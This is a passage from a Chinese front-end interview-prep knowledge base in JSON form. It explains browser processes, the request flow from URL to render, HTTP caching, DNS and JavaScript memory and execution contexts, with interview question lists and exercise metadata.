1、进程\n\n下图是我们打开一个掘金首页后，再打开任务管理器，观察发现，此时浏览器包括的进程有很多，浏览器主进程，GPU进程，网络进程，存储进程，音频进程，渲染进程，多个插件进程。\n\n![image.png](https://static.ecool.fun//article/4bf9d611-c15d-40de-9630-ebdc9349305e.jpeg)\n\n这些进程负责的功能如下：\n\n| 进程 | 说明 |\n| --- | --- |\n| 浏览器进程 | 负责浏览器各个子进程的通信，处理浏览器界面，包括地址栏等 |\n| 渲染进程 | 也就是我们看到的图中的标签页进程，也就是我们常说的浏览器内核，v8就在这个进程。主要负责解析html、js、css渲染页面等 |\n| 网络进程 | 负责发起网络请求，解析返回头信息 |\n| GUI进程 | 负责将渲染进程生成的图块转化成位图 |\n\n渲染进程是运行在沙箱之中的，可以执行js，但是不能获取系统权限，和浏览器进程通过IPC通讯。这是为了保证浏览器进程的安全，锁进沙箱，即使有恶意代码，也不能突破沙箱读取或写入系统信息。\n\n### 2、线程\n\n通过上图，我们已经知道线程是不能独立存在的，必须依附于进程。这里我们主要关注下渲染进程，因为他的主要工作就是：完成页面的渲染和展示。\n\n![image.png](https://static.ecool.fun//article/b7de44d0-9a5d-43d4-bbe8-b47e1d77129a.jpeg)\n\n如图，我们可以看到渲染进程包括很多线程，除了图上展示的，还有合成线程等，各有各的作用，具体内容，我们将会在后面一章节，浏览器渲染原理分析中在来讨论。\n\n## 三、浏览器请求的具体流程\n\n从用户输入域名到浏览器渲染页面完成的过程，可以分为以下几个部分：\n\n-   1、输入信息处理\n-   2、网络请求\n-   3、服务器返回请求资源\n-   4、浏览器渲染\n\n这里每一步涉及到的知识都非常多，其中缓存也在每个阶段占了很大比重，接着展开描述前三个阶段：\n\n### 1、地址栏输入信息处理\n\n当输入一个URL，浏览器会判断输入信息是检索信息还是请求URL\n\n-   如果是检索的信息，就构建请求搜索的URL，调用浏览器默认的搜索引擎进行检索。\n-   如果符合URL格式，浏览器主进程就通过IPC通信机制将URL发送给网络进程。\n\n### 2、网络进程发起网络请求\n\n1）网络进程首先会查找浏览器缓存，判断缓存是否存在，是否过期\n\n-   如果存在且不过期，就直接返回缓存信息。具体的缓存策略可以接着看下面的[浏览器缓存策略](#cache \"#cache\")\n\n2）如果没有缓存或过期，就开始进行DNS解析\n\n-   DNS解析的过程也很复杂，最终目的就是拿到目标主机的IP地址，具体的解析过程可以看下面的域名解析\n\n3）建立http连接或https连接\n\n-   http通过三次握手建立连接\n-   https需要建立TLS连接，浏览器会验证网站的数字证书是否合法，是否到期，是否安全等，这里https有自己的一套认证逻辑，我们重点不在这一块。\n-   这里两个问题常被问到，不了解可以学习一下\n    -   http和https的区别？\n    -   简述三次握手、四次挥手？\n\n4）发送请求\n\n-   网络进程会构建http请求头，向服务器发送实际请求\n\n5）网络传输，服务器处理，返回对应的资源\n\n-   请求从应用层发出，经过运输层、网络层、物理层、数据链路层找到服务器，服务器拿到请求信息，返回对应的资源\n-   这里的服务器可能是代理服务器，也可能是CDN节点，会判断当前数据是否存在缓存，如果有缓存且有效，直接返回（具体看配置的缓存策略），否则才会从服务器获取。\n-   网络传输数据也是很复杂的过程，具体可以看下面简单的介绍[计算机网络体系模型](#net \"#net\")\n\n### 3、服务器返回对应资源\n\n1）处理返回信息\n\n-   浏览器接收到服务器返回的资源信息，网络进程首先会解析返回的头信息，查看是否有Location字段，如果有的话，再次发起请求，很常见的就是请求http的站点，然后重定向到https。\n-   如下图我们输入的是`http://www.taobao.com/`，接口返回307内部重定向，然后浏览器再次进行了请求`https//www.taobao.com/`\n\n![image.png](https://static.ecool.fun//article/ab2a7bae-e07f-4e9e-82f0-57248f823ac9.jpeg)\n\n-   通过返回头字段`Content-Type`判断文件类型，如果其他类型，就调用不同的进程处理，如果是html类型，继续处理。\n\n![image.png](https://static.ecool.fun//article/fae754f3-2803-4f08-a6ff-1b2557eae4ef.jpeg)\n\n-   网络进程拿到返回的资源信息，会发送消息“提交导航”到浏览器主进程，浏览器主进程发送信息“提交文档”，提醒渲染进程准备接收返回的资源信息\n    \n-   渲染进程和网络进程构建通道，接收资源信息，并发送消息“提交文档”给浏览器主进程，告诉浏览器主进程我准备好了，浏览器主进程开始刷新页面，url、安全等信息。\n    \n-   此时页面将会触发`beforeunload`事件，在页面退出之前允许用户选择终止该流程（常应用于表单提交页面）。如果不监控该方法，浏览器就直接替换当前页面。\n    \n-   然后在渲染线程绘制出页面的之前，页面将存在空白时间，这就是各个技术团队在攻克的技术点，怎样让空白时间最短，这个时间取决于当前页面渲染的时长，那么我们还是要了解下浏览器是如何渲染服务器返回的资源。\n    \n\n8）四次挥手\n\n资源传输完毕，断开连接\n\n## 四、多个Tab页共用渲染进程\n\n我们打开任务管理器，看到如下图所示\n\n![image.png](https://static.ecool.fun//article/48e5ab6c-3ab3-4312-a393-bfa1cb83ba67.jpeg)\n\n我们发现很多标签页都是单独的一个进程，但是其中一些标签页确是共用一个渲染进程，为什么会这样？\n\n其实浏览器对于在当前站点打开的新Tab页面会做一些优化，如果他们同源，且执行环境相同，会直接复用当前站点的渲染进程。\n\n这样就可以提高渲染的性能，也能让父窗口和子窗口建立关联，但这样也造成了一定的隐患\n\n-   公用一个进程，如果当前进程中的一个线程出现问题，当前进程就会崩溃，公用同一个进程的页面也会崩溃。\n-   如果有恶意脚本就可以攻击新打开的页面，在新打开的页面中我们可以通过`window.opener`获取父页面的操作权限\n\n**如果没有关联**\n\n![image.png](https://static.ecool.fun//article/d66ede0d-55e7-4a81-be29-8cef05a07060.jpeg)\n\n**如果有关联**\n\n![image.png](https://static.ecool.fun//article/a3608b8b-3626-4d52-b519-ff8096cf184d.jpeg)\n\n这就是我们现实中可能会遇到的一个页面奔溃，其他同源站点全部退出的现象。\n\n那么这种共同使用一个渲染进程是如果出现的呢？在日常编码中我们常常有这三种方式：\n\n### 1、a标签\n\n一般情况下，项目中我们跳转采用a标签，如果调整的是同源页面，会出现\n\n```ini\n<a href=\"http://www.baidu.com\"></a>\n```\n\n该方法使用最新版的谷歌测试发现，在当前页面内打开一个同源的站点，使用的是独立的进程，这和预期的不符合，后面会继续测试看看。\n\n但是一般情况下，我们可以给a标签加上属性`rel=\"noopener norefferrer\"`来保证不同页面使用不同的进程。\n\n### 2、window.open\n\n```javascript\nwindow.open(\"http://www.baidu.com\")\n```\n\n使用`window.open`打开相同站点，肯定会出现使用同一个渲染进程，如果要规避，就要增加如下代码，去除两者的关联\n\n```ini\nlet newWin = window.open(\"http://my.dome.com\")\nnewWin.opener = null\n```\n\n### 3、Iframe\n\n页面中采用iframe框架引入其他页面，则iframe会独立成辅助框架，有自己的渲染进程，如果同源会采用同一个渲染进程。\n\n## 五、网络请求\n\n### 1、浏览器缓存策略\n\n-   存储策略\n-   强缓存\n-   协商缓存\n\n浏览器的缓存策略，有助于提高网页加载速度，减轻服务器压力。\n\n具体缓存的过程如图：\n\n![image.png](https://static.ecool.fun//article/a2861566-bb5e-49b0-8731-8b8c015e583f.jpeg)\n\n详细说明：\n\n1、当我们输入url，浏览器会去查看自身是否有缓存，如果没有缓存会直接请求服务器获取资源，并缓存到浏览器一份，返回数据会携带`ETag`字段和`Last-Modified`字段，状态码200 OK（from memory cache）,\n\n其中`ETag`是文件计算的hash值，如果文件不发生改变，这个值不会变。`Last-Modified`是文件最后的修改时间，如果文件更新或者覆盖就会显示最新的时间\n\n2、如果浏览器有缓存，此时检查http的请求头，看cache-control、expires字段，判断是否过了缓存的有效期，如果没有过有效期，则返回200状态码和对应的缓存数据。\n\n![image.png](https://static.ecool.fun//article/76b25f6f-9dba-4c7a-935a-f4d09b638b0c.jpeg)\n\n此时是强缓存\n\n-   expires是http1.0的定义，返回一个绝对的时间GMT，为过期时间。这就导致如果服务器时间和浏览器时间不一致，可能会使缓存失效。\n    \n-   cache-control是http1.1的定义，可以定义的值有\n    \n    -   max-age=600 表示最长有效期为600s\n    -   no-cache 不走浏览器缓存，每次都去浏览器协商缓存\n    -   no-store 每次都请求最新的资源\n    -   private 私有，只能在用户终端缓存，不能在cdn或代理服务器缓存\n    -   public 公有，可以在所有节点缓存\n-   两者同时存在，cache-control优先级高\n    \n\n3、如果浏览器缓存已过期，就携带请求头字段`If-None-Match`和`If-Modified-Since`去服务器拉取资源，服务器看到这两个字段，发现和当前服务器资源一致，就直接返回缓存和状态码304。服务器一般会先验证`If-None-Match/ETag`，如果不变，再去验证`If-Modified-Since/Last-Modified`\n\n![image.png](https://static.ecool.fun//article/87025dc0-fa8e-4ae3-bdc0-b75bd77d6322.jpeg)\n\n其中`If-Modified-Since`就是之前返回的`Last-Modified`，`If-None-Match`就是之前返回的`ETag`\n\n![image.png](https://static.ecool.fun//article/dd35e4c3-f7ef-4140-ac1a-25a9e9a80352.jpeg)\n\n如果第一次请求，默认没有缓存，浏览器将会进行缓存，浏览器缓存的都是派生文件， 比如css、js、img等不常变动的文件，内存缓存肯定比较小，所以会缓存一下js，页面关闭就清空了，disk memory 会在的时间会久一点。\n\n### 2、域名解析\n\nDNS就是域名系统，作用是将域名解析成对应的IP地址。具体的解析过程\n\n-   1、输入一个url，首先浏览器会对url进行解析，取出主机名\n-   2、接着查找浏览器自身的DNS缓存，查到返回对应IP\n-   3、没有找到，在本机找Host文件是否有对应的IP（host文件就是域名和ip的映射关系表），查到就返回IP\n-   3、没有的话，本地DNS服务器开始查找，向各级的DNS服务器发送查询报文，获取对应的IP地址\n\n在每次查找的过程中，浏览器，应用程序，DNS服务器都会对域名进行缓存，如果命中缓存，DNS会直接返回对应的IP，没有命中则继续查找相关的域名服务器，定位IP\n\n客户端\n\n客户端缓存\n\n本机Host文件\n\n本地DNS服务器\n\n管理方DNS服务器\n\n其他DNS服务器\n\n顶层DNS服务器\n\n根DNS服务器\n\n分析可知这个阶段，我们能优化的方法有限，常见的做法有：\n\n-   1、在html文件增加DNS缓存标签\n-   2、通过将域名解析到多个IP，做DNS的负载均衡\n\n```html\n<link rel=\"dns-prefetch\" href=\"//g.alicdn.com\" />\n```\n\n上面代码，会预取`g.test.com`解析\n\n```ini\n<meta http-equiv=\"x-dns-prefetch-control\" content=\"on\">\n```\n\n上面代码，设置自动开启DNS解析功能\n\n### 3、http请求过程\n\n这里的网络请求，我们默认为http请求。\n\n-   1、首先如果是第一次请求，域名经过DNS解析拿到映射的IP\n-   2、这里客户端发送http报文给对应的服务器，这个过程中要经过应用层、运输层、网络层、数据链路层和物理层对数据报的层层处理\n-   3、经过上一步的三次确认，也就是客户端和服务器（或代理服务器）进行三次握手建立TCP连接\n-   4、然后服务器返回对应的资源给客户端\n-   5、如果是第二次及以上的请求，浏览器或服务器会通过http的header参数，判断资源是否过期，如果没有过期，则使用缓存，如果过期，就去服务器拿新的资源\n\n### 4、五层计算机体系模型\n\n第二步，这里客户端发送http报文给对应的服务器，具体的过程为：\n\n-   1、首先应用层提供了很多协议，包括：http、ftp、POP3、IMAP，这里浏览器使用的是http协议，首先浏览器会在应用层，把请求的数据报按照http协议要求的格式，定义一系列请求的字段，推进TCP套接字，等待运输层接收。\n-   2、运输层主要的协议有：TCP和UDP，运输层拿到数据报以后，会先看是否和目的主机建立连接，如果没有，则进行三次握手，建立TCP连接。如果连接成功，会对数据报进一步封装，增加源主机端口号和目的主机端口号，进行差错检测，然后传递到网络层。\n-   3、网络层主要协议有：IP协议，接收运输层的数据报，然后增加目的主机IP，封装成一段段符合IP协议的IP数据报，经过若干个路由到达数据链路层\n-   4、数据链路层有ARP协议，可以通过IP地址解析目标地址的mac地址，通过物理层转发出去，到达目的局域网后，通过广播，被目的主机接收\n\n## 六、服务器处理阶段\n\n服务器获取请求，协商缓存查看资源是否有变化，如果没有变化返回缓存资源。\n\n-   CDN缓存\n\n这里如果存在代理服务器或者CDN节点，那么相当于增加了一个缓存节点，首先请求会转发到最新的CDN节点，CDN节点收到请求后会判断当前资源是否过期`cache-control`，如果过期就回源请求最新的资源，如果没有过期就返回缓存资源。\n\nCDN的存在解决了跨地域请求的时延问题；对服务器压力进行了分流。\n\n四次挥手：如果请求结束，服务器和客户端进行四次握手，断开连接。\n\n## 七、页面渲染阶段\n\n![image.png](https://static.ecool.fun//article/b9f7feb4-be0d-4564-a6d5-1ec9fe5bdba5.jpeg)",
    "testPoint": "-   浏览器为什么要进行url解析，编码规则是什么，如何解析\n-   域名解析的过程，递归查询，迭代查询\n-   网络请求三次握手、四次挥手原理，为什么要三次握手，两次不行吗\n-   网络请求的过程，计算机网络体系\n-   ping的原理是什么\n-   http缓存的分类，强缓存和协商缓存、启发式缓存\n-   如何设置http缓存\n-   http和https区别，不同版本的区别\n-   浏览器的渲染原理、渲染顺序\n-   页面渲染优化\n-   什么是重绘和回流\n-   三次握手、四次挥手",
    "exerciseKeyList": "[\"5def10e9-7825-4bd4-a76e-6d7eb555a2ce\"]",
    "vipLimit": 1,
    "level": 5,
    "pointOrder": 23,
    "createAt": "2024-11-05T04:21:11.000Z",
    "updateAt": "2024-11-06T06:12:23.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "5def10e9-7825-4bd4-a76e-6d7eb555a2ce",
        "title": "简单描述从输入网址到页面显示的过程",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:28:05.000Z",
        "updateAt": "2024-08-10T17:04:53.000Z"
      }
    ]
  },
  "151": {
    "id": 151,
    "tagId": 10,
    "title": "内存空间",
    "explanation": "![](https://static.ecool.fun//article/104894e3-b702-464f-ac60-30304bc248e1.jpeg)\n\n```javascript\nvar a = 20;\nvar b = 'abc';\nvar c = true;\nvar d = { m: 20 }\n```\n\n因为JavaScript具有自动垃圾回收机制，所以对于前端开发来说，内存空间并不是一个经常被提及的概念，很容易被大家忽视。特别是很多不是计算机专业的朋友在进入到前端之后，会对内存空间的认知比较模糊，甚至有些人干脆就是一无所知。\n\n当然也包括我自己。在很长一段时间里认为内存空间的概念在JS的学习中并不是那么重要。可是后我当我回过头来重新整理JS基础时，发现由于对它们的模糊认知，导致了很多东西我都理解得并不明白。比如最基本的引用数据类型和引用传递到底是怎么回事儿？比如浅复制与深复制有什么不同？还有闭包，原型等等。\n\n因此后来我才渐渐明白，想要对JS的理解更加深刻，就必须对内存空间有一个清晰的认知。\n\n在学习内存空间之前，我们需要对三种数据结构有一个直观的认知。他们分别是**堆(heap)，栈(stack)与队列(queue)**。\n\n##### 一、栈数据结构\n与C/C++不同，JavaScript中并没有严格意义上区分栈内存与堆内存。因此我们可以简单粗暴的理解为JavaScript的所有数据都保存在堆内存中。但是在某些场景，我们仍然需要基于堆栈数据结构的思维来实现一些功能，比如JavaScript的执行上下文（关于执行上下文我会在下一篇文章中总结）。执行上下文的执行顺序借用了栈数据结构的存取方式。(也就是后面我们会经常提到的函数调用栈)。因此理解栈数据结构的原理与特点十分重要。\n\n要简单理解栈的存取方式，我们可以通过类比乒乓球盒子来分析。如下图左侧。\n\n![](https://static.ecool.fun//article/d9187a0b-0516-47f4-a852-ecb84c2cbd41.jpeg)\n\n这种乒乓球的存放方式与栈中存取数据的方式如出一辙。处于盒子中最顶层的乒乓球5，它一定是最后被放进去，但可以最先被使用。而我们想要使用底层的乒乓球1，就必须将上面的4个乒乓球取出来，让乒乓球1处于盒子顶层。这就是栈空间**先进后出，后进先出**的特点。图中已经详细的表明了栈空间的存储原理。\n\n##### 二、堆数据结构\n堆数据结构是一种树状结构。它的存取数据的方式，则与书架与书非常相似。\n\n书虽然也整齐的存放在书架上，但是我们只要知道书的名字，我们就可以很方便的取出我们想要的书，而不用像从乒乓球盒子里取乒乓一样，非得将上面的所有乒乓球拿出来才能取到中间的某一个乒乓球。好比在JSON格式的数据中，我们存储的`key-value`是可以无序的，因为顺序的不同并不影响我们的使用，我们只需要关心书的名字。\n\n#### 三、队列\n在JavaScript中，理解队列数据结构的目的主要是为了清晰的明白事件循环（Event Loop）的机制到底是怎么回事。在后续的章节中我会详细分析事件循环机制。\n\n队列是一种先进先出（FIFO）的数据结构。正如排队过安检一样，排在队伍前面的人一定是最先过检的人。用以下的图示可以清楚的理解队列的原理。\n\n![](https://static.ecool.fun//article/bbd3b89b-703e-4dab-8651-c435b0e51e69.jpeg)\n\n##### 四、变量对象与基础数据类型\nJavaScript的执行上下文生成之后，会创建一个叫做变量对象的特殊对象（具体会在下一篇文章与执行上下文一起总结），JavaScript的基础数据类型往往都会保存在变量对象中。\n\n> 严格意义上来说，变量对象也是存放于堆内存中，但是由于变量对象的特殊职能，我们在理解时仍然需要将其于堆内存区分开来。\n>\n\n基础数据类型都是一些简单的数据段，JavaScript中有5中基础数据类型，分别是`Undefined、Null、Boolean、Number、String`。基础数据类型都是按值访问，因为我们可以直接操作保存在变量中的实际的值。\n\n> ES6中新加了一种基础数据类型Symbol，可以先不用考虑他\n>\n\n##### 五、引用数据类型与堆内存\n与其他语言不同，JS的引用数据类型，比如数组Array，它们值的大小是不固定的。引用数据类型的值是保存在堆内存中的对象。JavaScript不允许直接访问堆内存中的位置，因此我们不能直接操作对象的堆内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。因此，引用类型的值都是按引用访问的。这里的引用，我们可以理解为保存在变量对象中的一个地址，该地址与堆内存的实际值相关联。\n\n为了更好的搞懂变量对象与堆内存，我们可以结合以下例子与图解进行理解。\n\n```javascript\nvar a1 = 0;   // 变量对象\nvar a2 = 'this is string'; // 变量对象\nvar a3 = null; // 变量对象\n\nvar b = { m: 20 }; // 变量b存在于变量对象中，{m: 20} 作为对象存在于堆内存中\nvar c = [1, 2, 3]; // 变量c存在于变量对象中，[1, 2, 3] 作为对象存在于堆内存中\n```\n\n![](https://static.ecool.fun//article/9cf0e315-ad05-4b11-b232-8876380b1c51.jpeg)\n\n因此当我们要访问堆内存中的引用数据类型时，实际上我们首先是从变量对象中获取了该对象的地址引用（或者地址指针），然后再从堆内存中取得我们需要的数据。\n\n理解了JS的内存空间，我们就可以借助内存空间的特性来验证一下引用类型的一些特点了。\n\n在前端面试中我们常常会遇到这样一个类似的题目\n\n```javascript\n// demo01.js\nvar a = 20;\nvar b = a;\nb = 30;\n\n// 这时a的值是多少？\n```\n\n\n\n```javascript\n// demo02.js\nvar m = { a: 10, b: 20 }\nvar n = m;\nn.a = 15;\n\n// 这时m.a的值是多少\n```\n\n在变量对象中的数据发生复制行为时，系统会自动为新的变量分配一个新值。`var b = a`执行之后，a与b虽然值都等于20，但是他们其实已经是相互独立互不影响的值了。具体如图。所以我们修改了b的值以后，a的值并不会发生变化。\n\n![](https://static.ecool.fun//article/feae75df-d399-4ee9-afe6-13fe3a3de47a.jpeg)\n\n在demo02中，我们通过`var n = m`执行一次复制引用类型的操作。引用类型的复制同样也会为新的变量自动分配一个新的值保存在变量对象中，但不同的是，这个新的值，仅仅只是引用类型的一个地址指针。当地址指针相同时，尽管他们相互独立，但是在变量对象中访问到的具体对象实际上是同一个。如图所示。\n\n因此当我改变n时，m也发生了变化。这就是引用类型的特性。\n\n![](https://static.ecool.fun//article/6a46d0f1-67b4-43b8-a217-74ccd1ba5cb8.jpeg)\n\n通过内存的角度来理解，是不是感觉要轻松很多？除此之外，我们还可以以此为基础，一步一步的理解JavaScript的执行上下文，作用域链，闭包，原型链等重要概念。其他的我会在以后的文章慢慢总结，敬请期待。\n\n##### 六、内存空间管理\n因为JavaScript具有自动垃圾收集机制，所以我们在开发时好像不用关心内存的使用问题，内存的分配与回收都完全实现了自动管理。但是根据我自己的开发经验，了解内存机制有助于自己清晰的认识到自己写的代码在执行过程中发生过什么，从而写出性能更加优秀的代码。因此关心内存是一件非常重要的事情。\n\nJavaScript的内存生命周期\n\n```javascript\n1. 分配你所需要的内存\n2. 使用分配到的内存（读、写）\n3. 不需要时将其释放、归还\n```\n\n为了便于理解，我们使用一个简单的例子来解释这个周期。\n\n```javascript\nvar a = 20;  // 在内存中给数值变量分配空间\nalert(a + 100);  // 使用内存\na = null; // 使用完毕之后，释放内存空间\n```\n\n第一步和第二步我们都很好理解，JavaScript在定义变量时就完成了内存分配。第三步释放内存空间则是我们需要重点理解的一个点。\n\nJavaScript有自动垃圾收集机制，那么这个自动垃圾收集机制的原理是什么呢？其实很简单，就是找出那些不再继续使用的值，然后释放其占用的内存。垃圾收集器会每隔固定的时间段就执行一次释放操作。\n\n在JavaScript中，最常用的是通过**标记清除**的算法来找到哪些对象是不再继续使用的，因此`a = null`其实仅仅只是做了一个释放引用的操作，让 a 原本对应的值失去引用，脱离执行环境，这个值会在下一次垃圾收集器执行操作时被找到并释放。而在适当的时候解除引用，是为页面获得更好性能的一个重要方式。\n\n> + 在局部作用域中，当函数执行完毕，局部变量也就没有存在的必要了，因此垃圾收集器很容易做出判断并回收。但是全局变量什么时候需要自动释放内存空间则很难判断，因此在我们的开发中，需要尽量避免使用全局变量。\n> + 要详细了解垃圾收集机制，建议阅读《JavaScript高级编程》中的4.3节\n>\n\n",
    "testPoint": "1. **内存分配与回收**\n   - JavaScript 中的内存分配是如何进行的？有哪些常见的内存区域（如堆和栈）？\n   - 当一个函数执行完毕后，JavaScript 是如何处理该函数中占用的内存的？\n\n2. **垃圾回收机制**\n   - 请解释 JavaScript 中常见的垃圾回收机制，特别是标记-清除算法。\n   - 在什么情况下会导致内存无法回收？有哪些常见的内存泄漏场景？\n\n3. **闭包与内存管理**\n   - 闭包会导致什么样的内存问题？如何在使用闭包时尽量避免内存泄漏？\n   - 如何在需要时清除闭包中不再需要的引用，以减少内存占用？\n\n4. **内存泄漏的原因与防范**\n   - 举例说明几种常见的内存泄漏场景（例如，意外的全局变量、未清除的定时器或事件监听器、DOM 引用等）。\n   - 你如何在项目中监控和排查内存泄漏问题？\n\n5. **优化内存使用**\n   - 谈谈你在项目中如何管理和优化内存，确保页面性能。\n   - 你如何确保定时器、事件监听器等在使用完毕后被清理，以避免占用内存？\n\n6. **工具和方法**\n   - 使用过哪些工具或方法来检测和分析内存使用？比如浏览器开发者工具中的性能分析。\n   - 在调试内存问题时，你的常用流程是什么？\n",
    "exerciseKeyList": "[\"64279d15-4a32-42a1-809a-6e35d59c6e62\",\"aacd4d9c-67fc-414a-ba12-9cd93e065786\",\"30b5a8a5-5420-49cb-94b4-f45684eecba9\",\"7e744ea0-1c66-4ef9-b984-bb8828d98279\",\"7a9f621a-416f-4c2b-8d08-8f8e0a113c6a\",\"6dd983d9-39fc-48ca-9e22-7599ab339f5b\",\"b9bd9552-5748-45b1-88a8-f36e45f6261f\",\"fc324726-dc8d-4495-9da8-72fc70470b07\",\"cecf2aa7-4281-4255-95c9-e8ae487760f1\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 3,
    "createAt": "2024-11-06T14:32:29.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "30b5a8a5-5420-49cb-94b4-f45684eecba9",
        "title": "JS 中的数组和函数在内存中是如何存储的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-22T11:04:42.000Z"
      },
      {
        "exerciseKey": "64279d15-4a32-42a1-809a-6e35d59c6e62",
        "title": "JS 内存泄露的问题该如何排查？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2025-04-17T01:00:05.000Z"
      },
      {
        "exerciseKey": "6dd983d9-39fc-48ca-9e22-7599ab339f5b",
        "title": "如何检查Javascript中的内存泄漏？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:46:37.000Z",
        "updateAt": "2024-01-25T19:19:51.000Z"
      },
      {
        "exerciseKey": "7a9f621a-416f-4c2b-8d08-8f8e0a113c6a",
        "title": "js中数组是如何在内存中存储的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:41:06.000Z",
        "updateAt": "2024-08-10T17:06:03.000Z"
      },
      {
        "exerciseKey": "7e744ea0-1c66-4ef9-b984-bb8828d98279",
        "title": "JavaScript 是怎么做内存管理的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-19T01:20:52.000Z"
      },
      {
        "exerciseKey": "aacd4d9c-67fc-414a-ba12-9cd93e065786",
        "title": "JavaScript 中的变量在内存中的具体存储形式是什么",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:05:13.000Z"
      },
      {
        "exerciseKey": "b9bd9552-5748-45b1-88a8-f36e45f6261f",
        "title": "什么是内存泄漏？什么原因会导致呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:55:39.000Z",
        "updateAt": "2024-08-10T17:05:14.000Z"
      },
      {
        "exerciseKey": "cecf2aa7-4281-4255-95c9-e8ae487760f1",
        "title": "说说 JavaScript 中内存泄漏有哪几种情况？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T14:00:11.000Z",
        "updateAt": "2024-08-10T17:04:35.000Z"
      },
      {
        "exerciseKey": "fc324726-dc8d-4495-9da8-72fc70470b07",
        "title": "什么是内存泄漏？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:08:57.000Z",
        "updateAt": "2021-09-25T19:05:36.000Z"
      }
    ]
  },
  "152": {
    "id": 152,
    "tagId": 10,
    "title": "执行上下文",
    "explanation": "![](https://static.ecool.fun//article/b4cc2c74-d2ed-42ee-8cc8-3d0d7189922e.jpeg)  \n我们在JS学习初期或者面试的时候常常会遇到考核变量提升的思考题。比如先来一个简单一点的。\n\n```javascript\nconsole.log(a);   // 这里会打印出什么？\nvar a = 20;\n```\n\n暂时先不管这个例子，我们先引入一个JavaScript中最基础，但同时也是最重要的一个概念**执行上下文（Execution Context）**。\n\n每次当控制器转到可执行代码的时候，就会进入一个执行上下文。执行上下文可以理解为当前代码的执行环境，它会形成一个作用域。JavaScript中的运行环境大概包括三种情况。\n\n+ 全局环境：JavaScript代码运行起来会首先进入该环境\n+ 函数环境：当函数被调用执行时，会进入当前函数中执行代码\n+ eval（不建议使用，可忽略）\n\n\n\n因此在一个JavaScript程序中，必定会产生多个执行上下文，在我的上一篇文章中也有提到，JavaScript引擎会以栈的方式来处理它们，这个栈，我们称其为函数调用栈(call stack)。栈底永远都是全局上下文，而栈顶就是当前正在执行的上下文。\n\n当代码在执行过程中，遇到以上三种情况，都会生成一个执行上下文，放入栈中，而处于栈顶的上下文执行完毕之后，就会自动出栈。为了更加清晰的理解这个过程，根据下面的例子，结合图示给大家展示。\n\n> 执行上下文可以理解为函数执行的环境，每一个函数执行时，都会给对应的函数创建这样一个执行环境。\n>\n\n```javascript\nvar color = 'blue';\n\nfunction changeColor() {\n    var anotherColor = 'red';\n\n    function swapColors() {\n        var tempColor = anotherColor;\n        anotherColor = color;\n        color = tempColor;\n    }\n\n    swapColors();\n}\n\nchangeColor();\n```\n\n\n\n我们用ECStack来表示处理执行上下文组的堆栈。我们很容易知道，第一步，首先是全局上下文入栈。\n\n![](https://static.ecool.fun//article/07acb227-c02b-4bc8-b216-6d12b8ceccb3.jpeg)\n\n全局上下文入栈之后，其中的可执行代码开始执行，直到遇到了`changeColor()` ，这一句激活函数`changeColor`创建它自己的执行上下文，因此第二步就是changeColor的执行上下文入栈。\n\n![](https://static.ecool.fun//article/3023450e-4cda-431e-86f5-2c1503b3aab5.jpeg)\n\nchangeColor的上下文入栈之后，控制器开始执行其中的可执行代码，遇到`swapColors()`之后又激活了一个执行上下文。因此第三步是swapColors的执行上下文入栈。\n\n![](https://static.ecool.fun//article/15364ef5-c218-44be-b073-293003e5d999.jpeg)\n\n在swapColors的可执行代码中，再没有遇到其他能生成执行上下文的情况，因此这段代码顺利执行完毕，swapColors的上下文从栈中弹出。\n\n\n\n![](https://static.ecool.fun//article/a3f5f412-2560-491c-ab41-ca48649c95f2.jpeg)\n\n\n\nswapColors的执行上下文弹出之后，继续执行changeColor的可执行代码，也没有再遇到其他执行上下文，顺利执行完毕之后弹出。这样，ECStack中就只身下全局上下文了。\n\n![](https://static.ecool.fun//article/408c79cb-80d8-4828-a49b-1e59f3ceb2da.jpeg)\n\n\n\n全局上下文在浏览器窗口关闭后出栈。\n\n> 注意：函数中，遇到return能直接终止可执行代码的执行，因此会直接将当前上下文弹出栈。\n>\n\n![](https://static.ecool.fun//article/0d8266a5-98af-45a8-b488-180ee0b32815.jpeg)\n\n详细了解了这个过程之后，我们就可以对执行上下文总结一些结论了。\n\n+ 单线程\n+ 同步执行，只有栈顶的上下文处于执行中，其他上下文需要等待\n+ 全局上下文只有唯一的一个，它在浏览器关闭时出栈\n+ 函数的执行上下文的个数没有限制\n+ 每次某个函数被调用，就会有个新的执行上下文为其创建，即使是调用的自身函数，也是如此。\n\n为了巩固一下执行上下文的理解，我们再来绘制一个例子的演变过程，这是一个简单的闭包例子。\n\n```javascript\nfunction f1(){\n    var n=999;\n    function f2(){\n        alert(n);\n    }\n    return f2;\n}\nvar result=f1();\nresult(); // 999\n```\n\n因为f1中的函数f2在f1的可执行代码中，并没有被调用执行，因此执行f1时，f2不会创建新的上下文，而直到result执行时，才创建了一个新的。具体演变过程如下。\n\n![](https://static.ecool.fun//article/8317aa06-7a37-4901-8b2b-9a8307f86eb8.jpeg)\n\n最后留一个简单的例子，大家可以自己脑补一下这个例子在执行过程中执行上下文的变化情况。\n\n```javascript\nvar name = \"window\";\n\nvar p = {\n  name: 'Perter',\n  getName: function() {\n\n    // 利用变量保存的方式保证其访问的是p对象\n    var self = this;\n    return function() {\n      return self.name;\n    }\n  }\n}\n\nvar getName = p.getName();\nvar _name = getName();\nconsole.log(_name);\n```\n\n",
